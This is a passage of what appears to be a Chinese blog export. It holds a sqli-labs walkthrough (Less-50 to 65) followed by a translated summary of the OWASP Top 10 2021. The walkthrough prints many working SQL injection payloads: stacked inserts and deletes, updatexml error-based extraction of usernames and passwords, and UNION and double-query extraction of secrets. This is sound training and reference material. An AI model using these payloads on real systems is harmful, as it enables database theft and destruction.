BY的盲注注入和上一题一样，也是只是多了个&#39;包裹，其他的思路和48题是一样的 Less-50 GET-基于报错的数字型ORDER BY的堆叠注入前面几题都是大差不差，然后这题和前面不一样的地方在于多了 那就很明显我们这题也可以用堆叠注入来做。 第一遍：?sort=1;insert into users values(50,&#39;test&#39;,&#39;test&#39;);--+ 第二遍搜索?sort=1显示我们注入后的数据。 当然也可以直接利用报错注入 ?sort=1 and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users where id= 1),0x7e),1)--+ 来取数值 Less-51 GET-基于报错的字符型ORDER BY的堆叠注入这题与50类似，也是多了个&#39;而已。 报错注入payload: ?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users where id= 1),0x7e),1)--+ 堆叠注入payload: ?sort=1&#39;;insert into users values(51,&#39;test1&#39;,&#39;test1&#39;);--+ Less-52 GET-基于盲注的字符型ORDER BY的堆叠注入和50题的差别在于没有正常的回显，只能采用盲注的方式。 然后堆叠也可以用 ?sort=1;delete from users where id=50--+ （这里试试把之前注入的用户删掉） Less-53 GET-基于盲注的字符型ORDER BY的堆叠注入和52题只差了包裹，多了&#39;，也是盲注，脚本自己找一个改就行。 堆叠：?sort=1;delete from users where id=50--+ Less-54 GET-挑战-Union-只允许10次查询-变化1到这里，已经把所有的基础题目都做完了，可以开始新的挑战了。 这题是最简单的&#39;注入 这题先用?id=1&#39; or 1=1--+，发现正常回显，知道了包裹。 ?id=0&#39; union select 1,database(),3--+ 回显得到数据库名 ?id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;challenges&#39;--+回显得到一个表名 ?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;n0fnbea6lm&#39;--+ 回显得到字段 ?id=0&#39; union select 1,group_concat(secret_RX1A),group_concat(tryy) from n0fnbea6lm--+ 得到key Less-55 GET-挑战-Union-只允许14次查询-变化2这次比上一次更难试了很多种闭合，然后发现是)闭合。 ?id=1) or 1=1--+成功了 ?id=0) union select 1,2,database();--+ 得到数据库 ?id=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;;--+获取表 ?id=0) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;gwpvz828eg&#39;;--+ 获取列 ?id=0) union select 1,2,group_concat(secret_W6L9) from gwpvz828eg;--+ 得到key Less-56 GET-挑战-Union-只允许14次查询-变化3同样先试闭合方式。 ?id=1&quot; or 1=1--+成功，但是在union的时候无法回显。 接着尝试到了?id=0&#39;) or 1=1--+ ?id=0&#39;) union select 1,2,database()--+ ?id=0&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;--+ ?id=0&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;t96lxijl5t&#39;--+ ?id=0&#39;) union select 1,2,group_concat(secret_D11S) from t96lxijl5t--+ Less-57 GET-挑战-Union-只允许14次查询-变化4这次?id=1&quot; or 1=1--+又成功了 ?id=0&quot; union select 1,2,database()--+ ?id=0&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;--+ ?id=0&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;pc8la0qc78&#39;--+ ?id=0&quot; union select 1,2,group_concat(secret_QWQC) from pc8la0qc78--+ Less-58 GET-挑战-双注-只允许5次查询-变化1?id=1&#39; or 1=1--+ 判断了包裹的。 然后试了很多遍，然后我选择用报错注入做。 ?id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ ?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),0x7e),1)--+ ?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;ozm1wxxnuh&#39;),0x7e),1)--+ ?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_IXMP) from ozm1wxxnuh),0x7e),1)--+ 也存在着双注的做法： ?id=1&#39; union all select count(*),0x7e,concat( &#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a --+ ?id=0&#39; union all select count(*),0x7e,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;challenges&#39; limit 0,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ ?id=0&#39; union all select count(*),0x7e,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;2umgcpivnx&#39; limit 2,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ ?id=0&#39; union all select count(*),0x7e,concat(&#39;~&#39;,(select secret_WTEP from 2umgcpivnx),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ Less-59 GET-挑战-双注-只允许5次查询-变化2题目既然要双注，那我就用双注做。其实原理和上一题差不多，就是不一样的包裹。 ?id=1 or 1=1--+ 正常回显 ?id=0 union all select count(*),0x7e,concat( &#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a --+ ?id=0 union all select count(*),0x7e,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;challenges&#39; limit 0,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ ?id=0 union all select count(*),0x7e,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;7962zc281f&#39; limit 2,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ ?id=0 union all select count(*),0x7e,concat(&#39;~&#39;,(select secret_7FDG from 7962zc281f),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ Less-60 GET-挑战-双注-只允许5次查询-变化3?id=1&#39;) or 1=1--+和?id=1&quot;) or 1=1--+正常回显，但是前一种无法进行注入，因此确认为&quot;) ?id=1&quot;) union all select count(*),0x7e,concat( &#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a --+ ?id=1&quot;) union all select count(*),0x7e,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;challenges&#39; limit 0,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ ?id=1&quot;) union all select count(*),0x7e,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;dac1eclk7z&#39; limit 2,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ ?id=1&quot;) union all select count(*),0x7e,concat(&#39;~&#39;,(select secret_T9VH from dac1eclk7z),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ Less-61 GET-挑战-双注-只允许5次查询-变化4?id=1&#39;直接判断出了闭合为&#39;)) ?id=1&#39;)) or 1=1--+ 回显 ?id=1&#39;)) union all select count(*),0x7e,concat( &#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a --+ ?id=1&#39;)) union all select count(*),0x7e,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;challenges&#39; limit 0,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ ?id=1&#39;)) union all select count(*),0x7e,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;h1dkq5w7j4&#39; limit 2,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ ?id=1&#39;)) union all select count(*),0x7e,concat(&#39;~&#39;,(select secret_ZD80 from h1dkq5w7j4),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a--+ Less-62 GET-挑战-盲注-只允许130次查询-变化1由于是盲注，限制的条件也比较死，我写的脚本导致无法直接纯爆破应该是使用二分法，有办法在130次之内解决。但是主要还是研究清楚题目的思路，做出来的话网上脚本很多就不放了。 所以只提供思路，还是从包裹的入手，注入点应该是?id=1&#39;) --+ 通过&#39;) --+闭合 Less-63 GET-挑战-盲注-只允许130次查询-变化2与62类似，判断注入类型和闭合。 这里应该是?id=1&#39; or 1=1--+回显 通过&#39; --+闭合 Less-64 GET-挑战-盲注-只允许130次查询-变化3?id=1)) or 1=1--+回显 通过)) --+闭合 Less-65 GET-挑战-盲注-只允许130次查询-变化4?id=0&quot;) union select 1,2,3--+回显 通过&quot;) --+闭合 （对于最后这几题，我看有人说可以把要爆破的放入txt文件，然后在burpsuite进行爆破，然后根据回显判断，这应该也是可以的，但我还没有试，有条件的可以尝试一下） Less-66之后的关卡图片上显示有，但是我的靶场里没有，网上也没有人做就不知道在哪了，但是原理应该和我们之前所遇到的是差不多的，就这样吧，完结撒花。"},{"title":"2021版OWASP TOP 10","date":"2022-01-02T13:15:03.000Z","url":"/2022/01/02/2021%E7%89%88OWASP-TOP-10/","categories":[["undefined",""]],"content":"2021版OWASP TOP 10Top1 Broken Access Control 失效的访问控制描述​ 就是所谓的越权漏洞，未经过身份验证的用户，通过该漏洞访问未经授权的功能和数据。例如，获取他人的数据信息，修改他人的数据，访问权限等，都属于失效的访问控制所导致的后果。 常见的访问控制漏洞包括： 通过修改 URL、内部应用程序状态或 HTML 页面，或仅使用自定义 API 攻击工具来绕过访问控制检查。 允许将主键更改为其他用户的记录，允许查看或编辑其他人的帐户。 特权提升。在未登录的情况下充当用户或以用户身份登录时充当管理员。 元数据操作，例如重放或篡改 JSON Web 令牌 (JWT) 访问控制令牌，或用于提升权限或滥用 JWT 失效的 cookie 或隐藏字段。 CORS 错误配置允许未经授权的 API 访问。 强制以未经身份验证的用户身份浏览经过身份验证的页面或以标准用户身份浏览特权页面。访问 API 时缺少对 POST、PUT 和 DELETE 的访问控制。 预防方式 除公共资源外，默认拒绝。 实施一次访问控制机制并在整个应用程序中重复使用它们，包括最大限度地减少 CORS 的使用。 模型访问控制应该强制记录所有权，而不是接受用户可以创建、读取、更新或删除任何记录。 独特的应用程序业务限制要求应由领域模型强制执行。 禁用 Web 服务器目录列表并确保文件元数据（例如 .git）和备份文件不在 Web 根目录中。 记录访问控制失败，在适当时提醒管理员（例如，重复失败）。 速率限制 API 和控制器访问，以最大限度地减少自动攻击工具的危害。 注销后，JWT 令牌应在服务器上失效。 攻击场景示例场景 #1：应用程序在访问帐户信息的 SQL 调用中使用未经验证的数据： pstmt.setString(1, request.getParameter(“acct”)); 结果集结果 = pstmt.executeQuery(); 攻击者只需修改浏览器的“acct”参数即可发送他们想要的任何帐号。如果没有正确验证，攻击者可以访问任何用户的帐户。  场景#2：攻击者只是强制浏览到目标 URL。访问管理页面需要管理员权限。   如果未经身份验证的用户可以访问任一页面，则这是一个缺陷。如果非管理员可以访问管理页面，这是一个缺陷。 TOP2 Cryptographic Failures 加密失败描述​ 就是俗称的敏感数据暴露，存在范围极大，重点在于加密算法存在的问题，是密码学范畴的失败。对于需要加密和加密传输的数据，需要进行额外的保护。 常见的有： 是否有任何数据以明文形式传输？这涉及 HTTP、SMTP 和 FTP 等协议。外部互联网流量是危险的。验证所有内部流量，例如，负载平衡器、Web 服务器或后端系统之间的流量。 默认情况下或在较旧的代码中是否使用任何旧的或弱的加密算法？ 是否正在使用默认加密密钥、生成或重复使用弱加密密钥，或者是否缺少适当的密钥管理或轮换？ 是否未强制执行加密，例如，是否缺少任何用户代理（浏览器）安全指令或标头？ 用户代理（例如，应用程序、邮件客户端）是否不验证收到的服务器证书是否有效？ 预防方式至少执行以下操作，并查阅参考资料： 对应用程序处理、存储或传输的数据进行分类。根据隐私法、监管要求或业务需求确定哪些数据是敏感的。 根据分类应用控制。 不要不必要地存储敏感数据。尽快丢弃它或使用符合 PCI DSS 的标记化甚至截断。未保留的数据不能被窃取。 确保加密所有静态敏感数据。 确保拥有最新且强大的标准算法、协议和密钥；使用适当的密钥管理。 使用安全协议（例如具有完美前向保密 (PFS) 密码的 TLS、服务器的密码优先级和安全参数）加密所有传输中的数据。使用 HTTP 严格传输安全 (HSTS) 等指令强制加密。 对包含敏感数据的响应禁用缓存。 使用具有工作因子（延迟因子）的强自适应和加盐散列函数存储密码，例如 Argon2、scrypt、bcrypt 或 PBKDF2。 独立验证配置和设置的有效性。 攻击场景示例场景#1：应用程序使用自动数据库加密对数据库中的信用卡号进行加密。但是，此数据在检索时会自动解密，从而允许 SQL 注入缺陷以明文形式检索信用卡号。 场景#2：站点不使用或对所有页面强制执行 TLS 或支持弱加密。攻击者监视网络流量（例如，在不安全的无线网络中），将连接从 HTTPS 降级为 HTTP（使用sslstrip），拦截请求并窃取用户的会话 cookie。然后攻击者重放这个 cookie 并劫持用户的（经过身份验证的）会话，访问或修改用户的私人数据。除了上述之外，他们还可以更改所有传输的数据，例如，汇款的接收者。 场景#3：密码数据库使用未加盐或简单的哈希来存储每个人的密码。文件上传缺陷允许攻击者检索密码数据库。所有未加盐的哈希值都可以通过预先计算的哈希值彩虹表公开。由简单或快速散列函数生成的散列可能会被 GPU 破解，即使它们被加盐。 TOP3 Injection 注入描述最常见的就是sql注入，攻击者通过在web应用程序中事先定义好的查询语句结尾加上额外的sql语句，进而完成非法的操作 应用程序在以下情况下容易受到攻击： 应用程序不会验证、过滤或清理用户提供的数据。 没有上下文感知转义的动态查询或非参数化调用直接在解释器中使用。 在对象关系映射 (ORM) 搜索参数中使用恶意数据来提取额外的敏感记录。 直接使用或连接恶意数据。SQL 或命令包含动态查询、命令或存储过程中的结构和恶意数据。 一些更常见的注入是 SQL、NoSQL、OS 命令、对象关系映射 (ORM)、LDAP 和表达式语言 (EL) 或对象图导航库 (OGNL) 注入。这个概念在所有口译员中都是相同的。源代码审查是检测应用程序是否容易受到注入攻击的最佳方法。强烈建议对所有参数、标头、URL、cookie、JSON、SOAP 和 XML 数据输入进行自动化测试。组织可以将静态源 (SAST) 和动态应用程序测试 (DAST) 工具包含到 CI/CD 管道中，以在生产部署之前识别引入的注入缺陷。 预防方式 防止注入需要将数据与命令和查询分开。 首选选项是使用安全的 API，它完全避免使用解释器，提供参数化接口，或迁移到对象关系映射工具 (ORM)。 注意：即使在参数化时，如果 PL/SQL 或 T-SQL 连接查询和数据或使用 EXECUTE IMMEDIATE 或 exec() 执行恶意数据，则存储过程仍然会引入 SQL 注入。 使用正面或“白名单”服务器端输入验证。这不是一个完整的防御，因为许多应用程序需要特殊字符，例如文本区域或移动应用程序的 API。 对于任何残留的动态查询，使用该解释器的特定转义语法转义特殊字符。 注意：表名、列名等 SQL 结构不能转义，因此用户提供的结构名是危险的。这是报告编写软件中的常见问题。 在查询中使用 LIMIT 和其他 SQL 控件以防止在 SQL 注入的情况下大量披露记录。 攻击场景示例场景 #1：应用程序在构建以下易受攻击的 SQL 调用时使用不受信任的数据： String query = “SELECT * FROM accounts WHERE custID=’” + request.getParameter(“id”) + “‘“; 场景#2：类似地，应用程序对框架的盲目信任可能会导致查询仍然存在漏洞（例如，Hibernate 查询语言 (HQL)）： Query HQLQuery = session.createQuery(“FROM accounts WHERE custID=’” + request.getParameter(“id”) + “‘“); 在这两种情况下，攻击者都会修改浏览器中的 ‘id’ 参数值以发送：’ 或 ‘1’=’1。例如： ; 或 ‘1’=’1 这将更改两个查询的含义以返回帐户表中的所有记录。更危险的攻击可能会修改或删除数据，甚至调用存储过程。 TOP4 Insecure Design 不安全的设计描述​ 不安全设计是一个广泛的类别，代表许多不同的弱点，表现为“缺失或无效的控制设计”。无效的不安全设计可能会导致威胁的实现，比如在代码中存在漏洞的点容易被利用。 ​ 安全设计是一种方法，它不断评估威胁，经过测试避免已有的漏洞再次出现，防范已知的攻击手段。它需要安全的开发生命周期、某种形式的安全设计模式或铺砌道路组件库或工具，以及威胁建模。 预防方式 与 AppSec 专业人员建立并使用安全的开发生命周期，以帮助评估和设计与安全和隐私相关的控制 建立和使用安全设计模式库或准备使用组件的铺好的道路 将威胁建模用于关键身份验证、访问控制、业务逻辑和关键流 编写单元和集成测试以验证所有关键流都能抵抗威胁模型 攻击场景示例场景 #1：凭证恢复工作流程可能包括“问答”，这是 NIST 800-63b、OWASP ASVS 和 OWASP Top 10 所禁止的。不能将问答作为多个人身份的证据可以知道答案，这就是为什么它们被禁止。此类代码应删除并替换为更安全的设计。 场景#2：连锁影院允许团体预订折扣，并且在要求押金之前最多有 15 名参与者。攻击者可以对该流程进行威胁建模，并测试他们是否可以在几次请求中一次预订 600 个座位和所有电影院，从而造成巨大的收入损失。 场景 #3：零售连锁店的电子商务网站没有针对由黄牛运行的机器人提供保护，这些机器人购买高端显卡以转售拍卖网站。这对视频卡制造商和零售连锁店主造成了可怕的宣传，并与无法以任何价格获得这些卡的爱好者之间产生了仇恨。仔细的反机器人设计和域逻辑规则，例如在可用性的几秒钟内进行的购买，可能会识别出不真实的购买并拒绝此类交易。 TOP5 Security Misconfiguration 安全配置错误描述比如存在许多默认的控制台在不同的URL下也没有进行禁用，默认的账号密码弱口令没进行更改。默认的配置没有进行修改被利用了 如果应用程序是： 在应用程序堆栈的任何部分缺少适当的安全强化或对云服务的权限配置不正确。 启用或安装了不必要的功能（例如，不必要的端口、服务、页面、帐户或权限）。 默认帐户及其密码仍处于启用状态且未更改。 错误处理向用户显示堆栈跟踪或其他信息过多的错误消息。 对于升级的系统，最新的安全功能被禁用或未安全配置。 应用程序服务器、应用程序框架（例如，Struts、Spring、ASP.NET）、库、数据库等中的安全设置未设置为安全值。 服务器不发送安全标头或指令，或者它们未设置为安全值。 软件已过时或易受攻击（请参阅 A06:2021-易受攻击和过时的组件）。 如果没有协调一致的、可重复的应用程序安全配置过程，系统将面临更高的风险。 预防方式应实施安全安装过程，包括： 可重复的强化过程使部署另一个适当锁定的环境变得快速而轻松。开发、QA 和生产环境都应配置相同，在每个环境中使用不同的凭据。这个过程应该是自动化的，以最大限度地减少设置新安全环境所需的工作。 一个没有任何不必要的功能、组件、文档和示例的最小平台。删除或不安装未使用的功能和框架。 作为补丁管理流程的一部分，审查和更新适用于所有安全说明、更新和补丁的配置的任务（请参阅 A06:2021-易受攻击和过时的组件）。查看云存储权限（例如，S3 存储桶权限）。 分段应用程序架构通过分段、容器化或云安全组 (ACL) 在组件或租户之间提供有效且安全的分离。 向客户端发送安全指令，例如安全标头。 验证配置和设置在所有环境中的有效性的自动化过程。 攻击场景示例场景#1：应用程序服务器带有未从生产服务器中删除的示例应用程序。这些示例应用程序具有攻击者用来破坏服务器的已知安全漏洞。假设这些应用程序之一是管理控制台，并且默认帐户未更改。在这种情况下，攻击者使用默认密码登录并接管。 场景#2：服务器上没有禁用目录列表。攻击者发现他们可以简单地列出目录。攻击者找到并下载已编译的 Java 类，对其进行反编译和逆向工程以查看代码。然后攻击者发现应用程序中存在严重的访问控制缺陷。 场景#3：应用服务器的配置允许将详细的错误消息（例如堆栈跟踪）返回给用户。这可能会暴露敏感信息或潜在缺陷，例如已知易受攻击的组件版本。 场景#4：云服务提供商拥有其他 CSP 用户对 Internet 开放的默认共享权限。这允许访问存储在云存储中的敏感数据。 TOP6 Vulnerable and Outdated Components 易受攻击和过时的组件描述易受攻击的组件是我们难以测试和评估风险的已知问题。 比如已经过时的版本组件，没有及时的打上补丁被人用Nday打了 你可能很脆弱： 如果您不知道您使用的所有组件的版本（客户端和服务器端）。这包括您直接使用的组件以及嵌套的依赖项。 如果软件易受攻击、不受支持或已过期。这包括操作系统、Web/应用程序服务器、数据库管理系统 (DBMS)、应用程序、API 和所有组件、运行时环境和库。 如果您不定期扫描漏洞并订阅与您使用的组件相关的安全公告。 如果您没有以基于风险的方式及时修复或升级底层平台、框架和依赖项。这通常发生在修补是变更控制下的每月或每季度任务的环境中，使组织面临数天或数月不必要地暴露于固定漏洞的风险。 如果软件开发人员不测试更新、升级或修补的库的兼容性。 如果您不保护组件的配置（请参阅 A05:2021-安全配置错误）。 预防方式应该有一个补丁管理流程来： 删除未使用的依赖项、不必要的功能、组件、文件和文档。 使用版本、OWASP Dependency Check、retire.js 等工具持续清点客户端和服务器端组件（例如框架、库）及其依赖项的版本。成分。使用软件组合分析工具来自动化该过程。订阅与您使用的组件相关的安全漏洞的电子邮件警报。 仅通过安全链接从官方来源获取组件。首选签名包以减少包含修改后的恶意组件的机会（请参阅 A08:2021-软件和数据完整性故障）。 监视未维护或未为旧版本创建安全补丁的库和组件。如果无法打补丁，请考虑部署虚拟补丁来监控、检测或防止发现的问题。 每个组织都必须确保在应用程序或产品组合的生命周期内制定持续的监控、分类和应用更新或配置更改的计划。 攻击场景示例场景#1：组件通常以与应用程序本身相同的权限运行，因此任何组件中的缺陷都可能导致严重影响。此类缺陷可能是偶然的（例如，编码错误）或有意的（例如，组件中的后门）。发现的一些可利用组件漏洞的示例是： CVE-2017-5638 是一个 Struts 2 远程代码执行漏洞，可以在服务器上执行任意代码，已被归咎于重大漏洞。 虽然物联网 (IoT) 通常很难或不可能修补，但修补它们的重要性可能很大（例如，生物医学设备）。 有一些自动化工具可以帮助攻击者找到未打补丁或配置错误的系统。例如，Shodan IoT 搜索引擎可以帮助您找到仍然存在 2014 年 4 月修补的 Heartbleed 漏洞的设备。 TOP7 Identification and Authentication Failures 认证和授权失败描述​ 确认用户的身份、身份验证和会话管理对于防止与身份验证相关的攻击至关重要。如果应用程序存在以下情况，则可能存在身份验证漏洞： 允许自动攻击，例如撞库，其中攻击者拥有有效用户名和密码的列表。 允许蛮力或其他自动攻击。 允许使用默认密码、弱密码或众所周知的密码，例如“Password1”或“admin/admin”。 使用弱或无效的凭据恢复和忘记密码流程，例如无法确保安全的“基于知识的答案”。 使用纯文本、加密或弱散列密码（请参阅 A3:2017-敏感数据暴露）。 缺少或无效的多因素身份验证。 在 URL 中公开会话 ID（例如，URL 重写）。 成功登录后不要轮换会话 ID。 不会正确地使会话 ID 无效。用户会话或身份验证令牌（主要是单点登录 (SSO) 令牌）在注销或一段时间不活动期间未正确失效。 没有及时的对用户进行注销，默认的密码没有更改，密码被爆破出来。 预防方式 在可能的情况下，实施多因素身份验证以防止自动凭证填充、暴力破解和被盗凭证重用攻击。 不要使用任何默认凭据进行交付或部署，尤其是对于管理员用户。 实施弱密码检查，例如针对前 10,000 个最差密码列表测试新密码或更改的密码。 将密码长度、复杂性和轮换策略与 NIST 800-63b 的第 5.1.1 节中关于记忆秘密的指南或其他现代的、基于证据的密码策略保持一致。 通过对所有结果使用相同的消息，确保注册、凭据恢复和 API 路径能够抵御帐户枚举攻击。 限制或增加延迟失败的登录尝试。当检测到凭证填充、暴力破解或其他攻击时，记录所有故障并提醒管理员。 使用服务器端、安全、内置的会话管理器，在登录后生成新的高熵随机会话 ID。会话 ID 不应在 URL 中，安全存储，并在注销、空闲和绝对超时后失效。 攻击场景示例场景#1：凭证填充（使用已知密码列表）是一种常见的攻击。假设应用程序没有实施自动化威胁或凭证填充保护。在这种情况下，应用程序可以用作密码预言机来确定凭证是否有效。 场景#2：大多数身份验证攻击是由于继续使用密码作为唯一因素而发生的。一经考虑，最佳实践、密码轮换和复杂性要求会鼓励用户使用和重复使用弱密码。建议组织按照 NIST 800-63 停止这些做法并使用多因素身份验证。 场景 #3：应用程序会话超时设置不正确。用户使用公共计算机访问应用程序。用户没有选择“注销”，而是简单地关闭浏览器选项卡并走开。攻击者在一个小时后使用同一个浏览器，而用户仍然通过身份验证。 TOP8 Software and Data Integrity Failures 软件和数据完整性故障描述​ 软件和数据完整性故障与不能防止完整性违规的代码和基础设施有关。例如，在对象或数据被编码或序列化为攻击者可以看到和修改的结构的情况下，很容易受到不安全的反序列化的影响。另一种形式是应用程序依赖来自不受信任的来源、存储库和内容交付网络 (CDN) 的插件、库或模块。不安全的 CI/CD 管道可能会导致未经授权的访问、恶意代码或系统受损。最后，许多应用程序现在包括自动更新功能，其中更新在没有充分完整性验证的情况下被下载并应用于以前受信任的应用程序。攻击者可能会上传自己的更新以分发并在所有安装上运行。 预防方式 确保未签名或未加密的序列化数据不会在没有某种形式的完整性检查或数字签名的情况下发送到不受信任的客户端，以检测序列化数据的篡改或重放 通过签名或类似机制验证软件或数据来自预期来源 确保库和依赖项（例如 npm 或 Maven）使用受信任的存储库 确保使用软件供应链安全工具（例如 OWASP Dependency Check 或 OWASP CycloneDX）来验证组件不包含已知漏洞 确保您的 CI/CD 管道具有正确的配置和访问控制，以确保流经构建和部署过程的代码的完整性。 攻击场景示例场景 #1 不安全的反序列化： React 应用程序调用一组 Spring Boot 微服务。作为函数式程序员，他们试图确保他们的代码是不可变的。他们提出的解决方案是序列化用户状态并在每个请求中来回传递它。攻击者注意到“R00”Java 对象签名并使用 Java Serial Killer 工具在应用服务器上获取远程代码执行权。 场景 #2 无需签名即可更新：许多家用路由器、机顶盒、设备固件和其他固件不通过签名固件验证更新。未签名固件是攻击者越来越多的目标，预计只会变得更糟。这是一个主要问题，因为很多时候除了在未来版本中修复并等待以前的版本过时之外，没有任何补救机制。 场景#3 SolarWinds 恶意更新：众所周知，国家会攻击更新机制，最近的一次著名攻击是 SolarWinds Orion 攻击。开发该软件的公司拥有安全的构建和更新完整性流程。尽管如此，这些还是能够被破坏，并且在几个月的时间里，该公司向 18,000 多个组织分发了一个高度针对性的恶意更新，其中大约 100 个组织受到了影响。这是历史上此类性质最深远、最重大的违规行为之一。 TOP9 Security Logging and Monitoring Failures 安全日志记录和监控失败描述​ 帮助检测、升级和响应主动违规行为。如果没有日志记录和监控，就无法检测到漏洞。任何时候都会发生日志记录、检测、监控和主动响应不足的情况： 不记录可审计的事件，例如登录、失败登录和高价值交易。 警告和错误不会生成、不充分或不清楚的日志消息。 不会监控应用程序和 API 的日志是否存在可疑活动。 日志仅存储在本地。 适当的警报阈值和响应升级流程没有到位或有效。 DAST 工具（例如 OWASP ZAP）的渗透测试和扫描不会触发警报。 应用程序无法实时或接近实时地检测、升级或警告主动攻击。 ​ 通过使用户或攻击者可以看到日志记录和警报事件，您很容易受到信息泄漏的影响（请参阅 A01:2021 – 损坏的访问控制）。 没有提供可靠的日志和进行数据可靠的保护。无法及时检测到被人攻击以及泄露信息 预防方式开发人员应实施以下部分或全部控制措施，具体取决于应用程序的风险： 确保所有登录、访问控制和服务器端输入验证失败都可以用足够的用户上下文来记录，以识别可疑或恶意帐户，并保留足够的时间以允许延迟取证分析。 确保以日志管理解决方案可以轻松使用的格式生成日志。 确保日志数据编码正确，以防止对日志或监控系统的注入或攻击。 确保高价值交易具有带有完整性控制的审计跟踪，以防止篡改或删除，例如仅追加数据库表或类似的。 DevSecOps 团队应该建立有效的监控和警报，以便快速检测和响应可疑活动。 制定或采用事件响应和恢复计划，例如 NIST 800-61r2 或更高版本。 有商业和开源应用程序保护框架（例如 OWASP ModSecurity 核心规则集）和开源日志关联软件（例如 ELK 堆栈）具有自定义仪表板和警报功能。 攻击场景示例场景#1：由于缺乏监控和日志记录，一家儿童健康计划提供商的网站运营商无法检测到违规行为。外部方通知健康计划提供者，攻击者访问并修改了超过 350 万儿童的数千份敏感健康记录。事后审查发现网站开发人员没有解决重大漏洞。由于没有对系统进行日志记录或监控，数据泄露可能自 2013 年以来一直在进行，时间超过七年。 场景#2：印度一家大型航空公司发生数据泄露事件，涉及数百万乘客超过十年的个人数据，包括护照和信用卡数据。数据泄露发生在第三方云托管服务提供商处，该提供商在一段时间后将泄露事件通知了航空公司。 场景 #3：一家主要的欧洲航空公司遭遇了 GDPR 可报告的违规行为。据报道，该漏洞是由攻击者利用的支付应用程序安全漏洞引起的，他们收集了超过 400,000 条客户支付记录。该航空公司因此被隐私监管机构罚款 2000 万英镑。 TOP10 Server-Side Request Forgery 服务器请求伪造描述​ 每当 Web 应用程序在未验证用户提供的 URL 的情况下获取远程资源时，就会出现 SSRF 缺陷。它允许攻击者强制应用程序将精心设计的请求发送到意外目的地，即使受到防火墙、VPN 或其他类型的网络 ACL 的保护也是如此。 ​ 随着现代 Web 应用程序为最终用户提供方便的功能，获取 URL 成为一种常见情况。因此，SSRF 的发病率正在增加。此外，由于云服务和架构的复杂性，SSRF 的严重性越来越高。 预防方式开发人员可以通过实施以下部分或全部深度防御控制来防止 SSRF： 服务器端请求伪造 (SSRF) - 从网络层 在单独的网络中分段远程资源访问功能以减少 SSRF 的影响 强制执行“默认拒绝”防火墙策略或网络访问控制规则，以阻止除基本 Intranet 流量之外的所有流量 服务器端请求伪造 (SSRF) - 从应用层： 清理和验证所有客户端提供的输入数据 使用肯定的允许列表强制执行 URL 架构、端口和目标 不要向客户端发送原始响应 禁用 HTTP 重定向 注意 URL 一致性，以避免 DNS 重新绑定和“检查时间、使用时间”(TOCTOU) 竞争条件等攻击 不要通过使用拒绝列表或正则表达式来缓解 SSRF。攻击者拥有有效负载列表、工具和技能来绕过拒绝列表。 攻击场景示例场景#1：端口扫描内部服务器。如果网络架构是未分段的，攻击者可以绘制内部网络，并根据连接结果或连接或拒绝 SSRF 负载连接所用的时间来确定内部服务器上的端口是打开还是关闭。 场景#2：敏感数据暴露。攻击者可以访问本地文件，例如 或内部服务以获取敏感信息。 场景#3：访问云服务的元数据存储。大多数云提供商都有元数据存储，例如。攻击者可以读取元数据来获取敏感信息。 场景#4：破坏内部服务——攻击者可以滥用内部服务进行进一步的攻击，例如远程代码执行 (RCE) 或拒绝服务 (DoS)。"}]